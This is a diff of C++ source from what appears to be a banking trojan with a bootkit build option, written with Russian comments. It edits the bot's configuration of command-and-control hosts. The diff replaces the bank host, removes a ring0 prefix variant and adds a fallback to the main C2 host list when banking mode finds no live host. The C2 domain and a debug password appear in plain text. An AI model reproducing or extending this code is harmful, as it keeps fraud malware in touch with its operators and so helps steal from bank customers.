@@ -86,7 +86,7 @@ namespace CONFIGDEBUGSTRINGS
 
 	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
 
-	char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "bank.zika.in\0";
+	char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "rus.zdddddika.in\0";
 
 	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
 	char BOT_PREFIX[]     = "BSSTEST";
@@ -96,17 +96,13 @@ namespace CONFIGDEBUGSTRINGS
 
 
 //----------------------------------------------------------------------------
-// Префикс бота работающего в режиме Banking
-//
-// В борке bot.plug, ring0 версия, банкинг префикс отличается от префикса
-// в ring3 версии
+// Префикс бота работающего в режиме BANKING
 //----------------------------------------------------------------------------
 
 #ifndef BOTPLUG
 	char BOT_PREFIX_BANK[] = {'b','a','n','k','i','n','g', 0};
-#else
-	char BOT_PREFIX_BANK[] = {'b','k','b','a','n','k','i','n','g', 0};
 #endif
+
 
 
 
@@ -207,16 +203,19 @@ char *GetPrefix(bool CheckBankingMode)
 {
 	// Функция возвращает префикс бота
 
-		// Проверяем режим работы
 
-	if (CheckBankingMode && IsBankingMode())
-		return BOT_PREFIX_BANK;
+	#ifndef BOTPLUG
+		// В не буткит сборках проверяем режим работы и
+		// в случае если включен режим банкинг возвращаем
+		// ,fyrbyu ghtabrc
+		if (CheckBankingMode && IsBankingMode())
+			return BOT_PREFIX_BANK;
+	#endif
 
 	if (BOTPARAM_ENCRYPTED_PREFIX)
 		return Decrypt(BOT_PREFIX);
 	else
 		return BOT_PREFIX;
-
 }
 
 
@@ -371,14 +370,14 @@ string GetActiveHost(bool CheckBankingMode)
 {
 	// Функция возвращает активный (доступный) хост
 	#ifndef DEBUGCONFIG
-		PCHAR Host  = NULL;
+		PCHAR H  = NULL;
 
 		// Первым этапом пытаемся получить хост из файла
-		if (Hosts::GetActiveHostFormFile(NULL, Host))
+		if (Hosts::GetActiveHostFormFile(NULL, H))
 		{
 			CFGDBG("Cofig", "Получили хост из файла");
-			string Result(Host);
-			STR::Free(Host);
+			string Result(H);
+			STR::Free(H);
 			return Result;
 		}
 	#endif
@@ -389,8 +388,10 @@ string GetActiveHost(bool CheckBankingMode)
 	DWORD Hash;
 	bool  Encrypted;
 
+	bool IsBanking = CheckBankingMode && IsBankingMode();
 
-	if (CheckBankingMode && IsBankingMode())
+
+	if (IsBanking)
 	{
 		Hosts     = BOT_BANKHOSTS_ARRAY;
 		Encrypted = BOTPARAM_ENCRYPTED_BANKHOSTS;
@@ -404,7 +405,14 @@ string GetActiveHost(bool CheckBankingMode)
     }
 
 
-	return GetActiveHostFromBuf2(Hosts, Hash, Encrypted);
+	string Host = GetActiveHostFromBuf2(Hosts, Hash, Encrypted);
+
+	// В случае если в режиме BANKING не удалось получить
+	// рбочий хост, то берём его из основного мссива
+	if (Host.IsEmpty() && IsBanking)
+		Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS, BOTPARAM_ENCRYPTED_MAINHOSTS);
+
+	return Host;
 }
 //-----------------------------------------------------------------------------
 
